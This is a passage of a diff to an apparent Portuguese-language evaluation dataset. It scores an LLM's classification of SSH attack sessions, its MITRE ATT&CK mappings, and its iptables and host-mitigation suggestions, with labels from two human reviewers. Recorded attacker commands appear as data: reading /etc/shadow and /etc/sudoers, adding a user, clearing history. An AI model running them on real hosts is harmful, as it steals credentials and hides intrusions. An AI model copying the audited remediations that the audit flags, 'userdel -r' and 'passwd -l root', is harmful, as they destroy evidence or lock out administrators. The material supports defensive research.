+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Ação sobre usuário/processo inferido do campo Usuário ou do comando ('passwd -l sysadmin') sem confirmar existência no host. Ação sobre usuário/processo inferido do campo Usuário ou do comando ('sed -i '/backdoor/d' /etc/passwd') sem confirmar existência no host. Ação sobre usuário/processo inferido do campo Usuário ou do comando ('killall -u backdoor') sem confirmar existência no host."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.5,
+      "execucao_2_tempo_s": 1.52
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2995,7 +3706,8 @@
         "ss -tulnp",
         "find /etc -writable 2>/dev/null",
         "history -c"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -3047,13 +3759,41 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 4,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
-      "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -l root",
+        "lastlog"
+      ],
+      "comandos_secundarios_sem_ressalva": false,
+      "categorias_ressalva": [
+        "bloqueio_root"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Bloqueio da conta administrativa principal ('passwd -l root'), com risco de autonegação de acesso."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.48,
+      "execucao_2_tempo_s": 1.65
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -3115,7 +3855,8 @@
       "comandos": [
         "cat /etc/shadow",
         "history -c"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -3151,13 +3892,42 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 2,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
-      "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -a root",
+        "history -c"
+      ],
+      "comandos_secundarios_sem_ressalva": false,
+      "categorias_ressalva": [
+        "flag_invalida",
+        "limpeza_indevida"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Flag inválida em 'passwd -a root' (a opção '-a' do passwd só é válida junto com '-S'). Comando 'history -c' apaga histórico de comandos em vez de preservar evidências."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.28,
+      "execucao_2_tempo_s": 1.27
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -3251,7 +4021,8 @@
         "cat /etc/sudoers",
         "useradd -m -s /bin/bash suporte",
         "history -c && exit"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -3303,13 +4074,44 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 4,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [
+        "T1083 (ls -la /root e cat /etc/sudoers)"
+      ],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão. (Comandos secundários não listados separadamente: T1083 (ls -la /root e cat /etc/sudoers))."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "userdel -r suporte",
+        "passwd -l root"
+      ],
       "comandos_secundarios_sem_ressalva": false,
-      "observacao": "Ressalva nos comandos secundarios: sugere remocao imediata de diretorio home (userdel -r suporte) sem preservacao pericial previa."
+      "categorias_ressalva": [
+        "bloqueio_root",
+        "comando_destrutivo"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Comando destrutivo ('userdel -r suporte') que remove chaves SSH legítimas, diretórios ou evidências forenses. Bloqueio da conta administrativa principal ('passwd -l root'), com risco de autonegação de acesso."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.45,
+      "execucao_2_tempo_s": 1.53
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   }
 ]
